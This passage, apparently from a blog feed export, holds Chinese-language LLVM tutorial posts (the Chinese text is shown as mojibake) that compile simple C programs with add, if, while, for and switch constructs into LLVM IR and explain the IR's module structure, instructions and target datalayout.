keyword">unsigned</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> b<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">add2</span><span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯¹åº” <code>llvmIR .llæ–‡ä»¶</code></p><pre class="language-ll" data-language="ll"><code class="language-ll">define i32 @add1(i32 %a, i32 %b) &#123;entry:  %tmp1 &#x3D; add i32 %a, %b  ret i32 %tmp1&#125;define i32 @add2(i32 %a, i32 %b) &#123;entry:  %tmp1 &#x3D; icmp eq i32 %a, 0  br i1 %tmp1, label %done, label %recurserecurse:  %tmp2 &#x3D; sub i32 %a, 1  %tmp3 &#x3D; add i32 %b, 1  %tmp4 &#x3D; call i32 @add2(i32 %tmp2, i32 %tmp3)  ret i32 %tmp4done:  ret i32 %b&#125;</code></pre><h3 id="LLVM-IRç»“æ„">LLVM IRç»“æ„</h3><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/NVzoCQA5fSta4kG.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/NVzoCQA5fSta4kG.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><ul><li>Moduleï¼ˆæ¨¡å—ï¼‰æ˜¯ä¸€ä»½LLVM IRçš„é¡¶å±‚å®¹å™¨ï¼Œå¯¹åº”äºç¼–è¯‘å‰ç«¯çš„æ¯ä¸ªç¿»è¯‘å•å…ƒï¼ˆTranslationUnitï¼‰ã€‚æ¯ä¸ªæ¨¡å—ç”±ç›®æ ‡æœºå™¨ä¿¡æ¯ã€å…¨å±€ç¬¦å·ï¼ˆå…¨å±€å˜é‡å’Œå‡½æ•°ï¼‰åŠå…ƒä¿¡æ¯ç»„æˆã€‚</li><li>Functionï¼ˆå‡½æ•°ï¼‰å°±æ˜¯ç¼–ç¨‹è¯­è¨€ä¸­çš„å‡½æ•°ï¼ŒåŒ…æ‹¬å‡½æ•°ç­¾åå’Œè‹¥å¹²ä¸ªåŸºæœ¬å—ï¼Œå‡½æ•°å†…çš„ç¬¬ä¸€ä¸ªåŸºæœ¬å—å«åšå…¥å£åŸºæœ¬å—ã€‚</li><li>BasicBlockï¼ˆåŸºæœ¬å—ï¼‰æ˜¯ä¸€ç»„é¡ºåºæ‰§è¡Œçš„æŒ‡ä»¤é›†åˆï¼Œåªæœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£ï¼Œéå¤´å°¾æŒ‡ä»¤æ‰§è¡Œæ—¶ä¸ä¼šè¿èƒŒé¡ºåºè·³è½¬åˆ°å…¶ä»–æŒ‡ä»¤ä¸Šå»ã€‚æ¯ä¸ªåŸºæœ¬å—æœ€åä¸€æ¡æŒ‡ä»¤ä¸€èˆ¬æ˜¯è·³è½¬æŒ‡ä»¤ï¼ˆè·³è½¬åˆ°å…¶å®ƒåŸºæœ¬å—ä¸Šå»ï¼‰ï¼Œå‡½æ•°å†…æœ€åä¸€ä¸ªåŸºæœ¬å—çš„æœ€åæ¡æŒ‡ä»¤æ˜¯å‡½æ•°è¿”å›æŒ‡ä»¤ã€‚</li><li>Instructionï¼ˆæŒ‡ä»¤ï¼‰æ˜¯LLVM IRä¸­çš„æœ€å°å¯æ‰§è¡Œå•ä½ï¼Œæ¯ä¸€æ¡æŒ‡ä»¤éƒ½å•å ä¸€è¡Œ</li></ul><p><strong>LLVM IRå¤´éƒ¨æ˜¯ä¸€äº›Target Informationï¼Œ</strong></p><pre class="language-llvm" data-language="llvm"><code class="language-llvm"><span class="token comment">; ModuleID = 'add.c'</span><span class="token keyword">source_filename</span> <span class="token punctuation">=</span> <span class="token string">"add.c"</span><span class="token keyword">target</span> <span class="token keyword">datalayout</span> <span class="token punctuation">=</span> <span class="token string">"e-m:o-i64:64-f80:128-n8:16:32:64-S128"</span><span class="token keyword">target</span> <span class="token keyword">triple</span> <span class="token punctuation">=</span> <span class="token string">"x86_64-apple-macosx10.14.0"</span></code></pre><p>æ¯ä¸€è¡Œåˆ†åˆ«æ˜¯ï¼Œ</p><ul><li><code>ModuleID</code>ï¼šç¼–è¯‘å™¨ç”¨äºåŒºåˆ†ä¸åŒæ¨¡å—çš„ID</li><li><code>source_filename</code>ï¼šæºæ–‡ä»¶å</li><li><code>target datalayout</code>ï¼šç›®æ ‡æœºå™¨æ¶æ„æ•°æ®å¸ƒå±€</li><li><code>target triple</code>ï¼šç”¨äºæè¿°ç›®æ ‡æœºå™¨ä¿¡æ¯çš„ä¸€ä¸ªå…ƒç»„ï¼Œä¸€èˆ¬å½¢å¼æ˜¯<code>&lt;architecture&gt;-&lt;vendor&gt;-&lt;system&gt;[-extra-info]</code></li></ul><p>éœ€è¦å…³æ³¨çš„æ˜¯<code>target datalayout</code>ï¼Œå®ƒç”±<code>-</code>åˆ†éš”çš„ä¸€åˆ—è§„æ ¼ç»„æˆ</p><ul><li><code>e</code>ï¼šå†…å­˜å­˜å‚¨æ¨¡å¼ä¸ºå°ç«¯æ¨¡å¼</li><li><code>m:o</code>ï¼šç›®æ ‡æ–‡ä»¶çš„æ ¼å¼æ˜¯Machæ ¼å¼</li><li><code>i64:64</code>ï¼š64ä½æ•´æ•°çš„å¯¹é½æ–¹å¼æ˜¯64ä½ï¼Œå³8å­—èŠ‚å¯¹é½</li><li><code>f80:128</code>ï¼š80ä½æ‰©å±•ç²¾åº¦æµ®ç‚¹æ•°çš„å¯¹é½æ–¹å¼æ˜¯128ä½ï¼Œå³16å­—èŠ‚å¯¹é½</li><li><code>n8:16:32:64</code>ï¼šæ•´å‹æ•°æ®æœ‰8ä½çš„ã€16ä½çš„ã€32ä½çš„å’Œ64ä½çš„</li><li><code>S128</code>ï¼š128ä½æ ˆè‡ªç„¶å¯¹é½</li></ul><blockquote><p>è¯¦ç»† <a href="https://llvm.org/docs/LangRef.html#data-layout">https://llvm.org/docs/LangRef.html#data-layout</a></p></blockquote></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM å­¦ä¹ (ä¸‰) -æ ·ä¾‹å­¦ä¹ </title>
      <link href="/posts/9d5c50c6/"/>
      <url>/posts/9d5c50c6/</url>
      
        <content type="html"><![CDATA[<h1>LLVM å­¦ä¹ (ä¸‰) -æ ·ä¾‹å­¦ä¹ </h1><blockquote><p>@2022-04-17 09:28:38</p><p>@sizaif</p><p><img src="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></blockquote><h2 id="LLVM-IR-æ ·ä¾‹å­¦ä¹ ">LLVM IR æ ·ä¾‹å­¦ä¹ </h2><div class="story post-story"><h3 id="1-åŸºæœ¬è¯­æ³•">1. åŸºæœ¬è¯­æ³•</h3><ol><li>ç¼–å†™<code>c</code>ä»£ç </li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">hello</span><span class="token expression"><span class="token punctuation">.</span>c</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">22</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">add</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol start="2"><li>å°†<code>c</code>æºç è½¬æ¢ä¸º<code>LLVM IR-ll</code>æ ¼å¼</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">$ clang -emit-llvm -S hello.c -o hello.ll</code></pre><ol start="3"><li>ç”Ÿæˆçš„<code>hello.ll</code>å†…å®¹å¦‚ä¸‹</li></ol><pre class="language-none"><code class="language-none">; ModuleID &#x3D; &#39;hello.c&#39;source_filename &#x3D; &quot;hello.c&quot;target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;@.str &#x3D; private unnamed_addr constant [4 x i8] c&quot;%d\0A\00&quot;, align 1; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @add(i32 noundef %0, i32 noundef %1) #0 &#123;  %3 &#x3D; alloca i32, align 4  %4 &#x3D; alloca i32, align 4  store i32 %0, i32* %3, align 4  store i32 %1, i32* %4, align 4  %5 &#x3D; load i32, i32* %3, align 4  %6 &#x3D; load i32, i32* %4, align 4  %7 &#x3D; add nsw i32 %5, %6  ret i32 %7&#125;; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @main() #0 &#123;  %1 &#x3D; alloca i32, align 4  %2 &#x3D; alloca i32, align 4  %3 &#x3D; alloca i32, align 4  store i32 0, i32* %1, align 4  store i32 10, i32* %2, align 4  store i32 22, i32* %3, align 4  %4 &#x3D; load i32, i32* %2, align 4  %5 &#x3D; load i32, i32* %3, align 4  %6 &#x3D; call i32 @add(i32 noundef %4, i32 noundef %5)  %7 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i32 noundef %6)  ret i32 0&#125;declare dso_local i32 @printf(i8* noundef, ...) #1attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #1 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;!llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125;!llvm.ident &#x3D; !&#123;!3&#125;!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;!1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;!2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;!3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125;</code></pre><p>æ³¨è§£æ˜¯ä»¥ ; åˆ†éš”ä¸”ç›´åˆ°å½“å‰è¡Œçš„ç»“å°¾</p><p>@ä»£è¡¨å…¨å±€æ ‡è¯†ç¬¦ï¼ˆå‡½æ•°ï¼Œå…¨å±€å˜é‡ï¼‰ï¼›</p><p>%ä»£è¡¨å±€éƒ¨æ ‡è¯†ç¬¦ï¼ˆå¯„å­˜å™¨åç§°ä¹Ÿå°±æ˜¯å±€éƒ¨å˜é‡ï¼Œç±»å‹ï¼‰ã€‚</p><p>allocaæŒ‡ä»¤ï¼šç”¨äºåˆ†é…å†…å­˜å †æ ˆç»™å½“å‰æ‰§è¡Œçš„å‡½æ•°,å½“è¿™ä¸ªå‡½æ•°è¿”å›å…¶è°ƒç”¨è€…æ—¶è‡ªåŠ¨é‡Šæ”¾,</p><pre class="language-none"><code class="language-none">; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @add(i32 noundef %0, i32 noundef %1) #0 &#123;  %3 &#x3D; alloca i32, align 4 ; åˆ†é…ä¸€ä¸ªå†…å­˜åˆ°å±€éƒ¨å˜é‡%3ï¼Œ4å­—èŠ‚å¯¹é½  %4 &#x3D; alloca i32, align 4 ; åˆ†é…ä¸€ä¸ªå†…å­˜åˆ°å±€éƒ¨å˜é‡%4ï¼Œ4å­—èŠ‚å¯¹é½  store i32 %0, i32* %3, align 4 ; å°†i32ç±»å‹çš„å˜é‡%0å­˜åˆ°å†…å­˜%3ä¸­, 4å­—èŠ‚å¯¹é½  store i32 %1, i32* %4, align 4 ; å°†i32ç±»å‹çš„å˜é‡%1å­˜åˆ°å†…å­˜%4ä¸­, 4å­—èŠ‚å¯¹é½  %5 &#x3D; load i32, i32* %3, align 4 ; è¯»å–å˜é‡%3å†…å­˜ä¸­çš„æ•°æ®å­˜æ”¾åˆ°ä¸´æ—¶å˜é‡%5ä¸­ï¼Œ4å­—èŠ‚å¯¹é½  %6 &#x3D; load i32, i32* %4, align 4 ; è¯»å–å˜é‡%4å†…å­˜ä¸­çš„æ•°æ®å­˜æ”¾åˆ°ä¸´æ—¶å˜é‡%6ä¸­ï¼Œ4å­—èŠ‚å¯¹é½  %7 &#x3D; add nsw i32 %5, %6 ; å°†å˜é‡%5,%6ä¸­çš„æ•°æ®è¿›è¡Œaddè¿ç®—,ç»“æ„å­˜åˆ°%7ä¸­  ret i32 %7 ; è¿”å›i32ç±»å‹çš„%7&#125;</code></pre><ol start="4"><li><p><code>hello.ll</code>è½¬å›<code>hello.bc</code> bitcodeæ ¼å¼</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ llvm-as hello.ll -o hello.bcroot@0187031113b5:/home/workhome/llvm_test<span class="token comment"># ll</span>total <span class="token number">20</span>drwxr-xr-x <span class="token number">2</span> root root <span class="token number">4096</span> Apr <span class="token number">17</span> 02:09 ./drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4096</span> Apr <span class="token number">16</span> 06:51 <span class="token punctuation">..</span>/-rw-r--r-- <span class="token number">1</span> root root <span class="token number">2456</span> Apr <span class="token number">17</span> 02:09 hello.bc-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">142</span> Apr <span class="token number">17</span> 02:06 hello.c-rw-r--r-- <span class="token number">1</span> root root <span class="token number">1838</span> Apr <span class="token number">17</span> 02:06 hello.ll</code></pre></li><li><p>æ‰§è¡Œ<code>hello.bc</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ lli hello.bcroot@0187031113b5:/home/workhome/llvm_test<span class="token comment"># lli hello.bc</span><span class="token number">32</span></code></pre></li></ol><h3 id="2-if-è¯­å¥">2. if è¯­å¥</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">if</span><span class="token expression"><span class="token punctuation">.</span>c</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span> </span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-none"><code class="language-none"># if.ll; ModuleID &#x3D; &#39;if.c&#39;source_filename &#x3D; &quot;if.c&quot;target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @main() #0 &#123;  %1 &#x3D; alloca i32, align 4  %2 &#x3D; alloca i32, align 4  store i32 0, i32* %1, align 4  store i32 11, i32* %2, align 4  %3 &#x3D; load i32, i32* %2, align 4  %4 &#x3D; srem i32 %3, 2 ; srem å¸¦ç¬¦å·æ•´æ•°æ±‚ä½™  %5 &#x3D; icmp eq i32 %4, 0 ; æ¯”è¾ƒ %4 ä¸0 æ˜¯å¦ç›¸ç­‰  br i1 %5, label %6, label %7 ; åˆ†æ”¯é€‰æ‹©ï¼Œæ ¹æ®%5ç»“æœè·³è½¬åˆ°%6æˆ–%76:                                                ; preds &#x3D; %0  store i32 0, i32* %1, align 4  br label %87:                                                ; preds &#x3D; %0  store i32 1, i32* %1, align 4  br label %88:                                                ; preds &#x3D; %7, %6  %9 &#x3D; load i32, i32* %1, align 4  ret i32 %9&#125;attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;!llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125;!llvm.ident &#x3D; !&#123;!3&#125;!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;!1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;!2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;!3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125;</code></pre><ul><li>é€šè¿‡<code>icmp</code>æŒ‡ä»¤è¿›è¡Œæ¯”è¾ƒï¼Œäº§ç”Ÿä¸€ä¸ªç»“æœå€¼</li><li><code>br</code>æŒ‡ä»¤æ ¹æ®ç»“æœå€¼ï¼Œè·³è½¬åˆ°ç›¸åº”çš„åˆ†æ”¯å…¥å£</li><li>åˆ†æ”¯æ‰§è¡Œå®Œæˆåï¼Œæ ¹æ®<code>br</code>æ— æ¡ä»¶åˆ†æ”¯è·³è½¬åˆ°ç»“æŸåˆ†æ”¯</li></ul><h3 id="3-While-è¯­å¥">3. While è¯­å¥</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">while</span><span class="token expression"><span class="token punctuation">.</span>c</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token keyword">while</span><span class="token punctuation">(</span>a <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>   a<span class="token operator">++</span><span class="token punctuation">;</span>   b <span class="token operator">*=</span> a<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-none"><code class="language-none">#while.ll; ModuleID &#x3D; &#39;while.c&#39;source_filename &#x3D; &quot;while.c&quot;target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @main() #0 &#123;  %1 &#x3D; alloca i32, align 4  %2 &#x3D; alloca i32, align 4  %3 &#x3D; alloca i32, align 4  store i32 0, i32* %1, align 4  store i32 0, i32* %2, align 4  store i32 1, i32* %3, align 4  br label %4 ; è¿›å…¥æ ‡ç­¾%4, è¿›å…¥whileå¾ªç¯å…¥å£; è¿›å…¥whileå¾ªç¯å…¥å£4:                                                ; preds &#x3D; %7, %0  %5 &#x3D; load i32, i32* %2, align 4  %6 &#x3D; icmp slt i32 %5, 10  ; æ¯”è¾ƒ%5 å°äº10  br i1 %6, label %7, label %13  ; æ ¹æ®%6 æ¯”è¾ƒçš„ç»“æœåˆ†æ”¯è¿›å…¥%7 æˆ–%13; while å¾ªç¯ body7:                                                ; preds &#x3D; %4  %8 &#x3D; load i32, i32* %2, align 4 ; ä»%2ä¸­è¯»å–å€¼ ä»¥i32ç±»å‹å­˜åˆ°%8ä¸­  %9 &#x3D; add nsw i32 %8, 1 ; %9 &#x3D; %8 +1   store i32 %9, i32* %2, align 4 ; å°†%9 å­˜åˆ°%2ä¸­  %10 &#x3D; load i32, i32* %2, align 4 ; ä»%2ä¸­è¯»å–å€¼ ä»¥i32ç±»å‹å­˜åˆ°%10ä¸­   %11 &#x3D; load i32, i32* %3, align 4 ; ä»%3ä¸­è¯»å–å€¼ ä»¥i32ç±»å‹å­˜åˆ°%11ä¸­  %12 &#x3D; mul nsw i32 %11, %10 ; %12 &#x3D; %11 * %10  store i32 %12, i32* %3, align 4 ; å°†%12 å­˜åˆ°%3ä¸­  br label %4, !llvm.loop !413:                                               ; preds &#x3D; %4  %14 &#x3D; load i32, i32* %3, align 4  ret i32 %14&#125;attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;!llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125;!llvm.ident &#x3D; !&#123;!3&#125;!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;!1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;!2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;!3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125;!4 &#x3D; distinct !&#123;!4, !5&#125;!5 &#x3D; !&#123;!&quot;llvm.loop.mustprogress&quot;&#125;</code></pre><ul><li>é€šè¿‡<code>icmp</code>æŒ‡ä»¤è¿›è¡Œå¾ªç¯æ¡ä»¶æ¯”è¾ƒ</li><li>é€šè¿‡<code>br</code>æŒ‡ä»¤è¿›è¡Œæ§åˆ¶è·³è½¬</li><li><code>loop</code>å¾ªç¯ï¼Œç›´åˆ° è·³å‡ºåˆ°<code>while.end</code></li></ul><h3 id="4-for-è¯­å¥">4. for è¯­å¥</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">for</span><span class="token expression"><span class="token punctuation">.</span>c</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        a <span class="token operator">+=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-none"><code class="language-none">#for.ll; ModuleID &#x3D; &#39;for.c&#39;source_filename &#x3D; &quot;for.c&quot;target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;@.str &#x3D; private unnamed_addr constant [4 x i8] c&quot;%d\0A\00&quot;, align 1; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @main() #0 &#123;  %1 &#x3D; alloca i32, align 4  %2 &#x3D; alloca i32, align 4  %3 &#x3D; alloca i32, align 4  store i32 0, i32* %1, align 4  store i32 1, i32* %2, align 4  store i32 0, i32* %3, align 4  br label %4 ; è·³è½¬åˆ°forå¾ªç¯å…¥å£; for å¾ªç¯å…¥å£4:                                                ; preds &#x3D; %11, %0  %5 &#x3D; load i32, i32* %2, align 4  %6 &#x3D; icmp sle i32 %5, 50  br i1 %6, label %7, label %14  ; å¾ªç¯loopæ§åˆ¶; for å¾ªç¯ body7:                            1                    ; preds &#x3D; %4  %8 &#x3D; load i32, i32* %2, align 4  %9 &#x3D; load i32, i32* %3, align 4  %10 &#x3D; add nsw i32 %9, %8  store i32 %10, i32* %3, align 4  br label %11; for å¾ªç¯ ç¬¬ä¸‰éƒ¨åˆ†æ“ä½œ11:                                               ; preds &#x3D; %7  %12 &#x3D; load i32, i32* %2, align 4  %13 &#x3D; add nsw i32 %12, 1  store i32 %13, i32* %2, align 4  br label %4, !llvm.loop !414:                                               ; preds &#x3D; %4  %15 &#x3D; load i32, i32* %3, align 4  %16 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i32 noundef %15)  ret i32 0&#125;declare dso_local i32 @printf(i8* noundef, ...) #1attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #1 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;!llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125;!llvm.ident &#x3D; !&#123;!3&#125;!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;!1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;!2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;!3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125;!4 &#x3D; distinct !&#123;!4, !5&#125;!5 &#x3D; !&#123;!&quot;llvm.loop.mustprogress&quot;&#125;</code></pre><p><code>if</code>,<code>for</code>,<code>while</code> ä¸‰ä¸ªç»“æ„ç±»å‹ï¼Œ å³ æ¡ä»¶åˆ¤æ–­+å¾ªç¯æ§åˆ¶</p><h3 id="5-Switch">5. Switch</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">switch</span><span class="token expression"><span class="token punctuation">.</span>c</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token 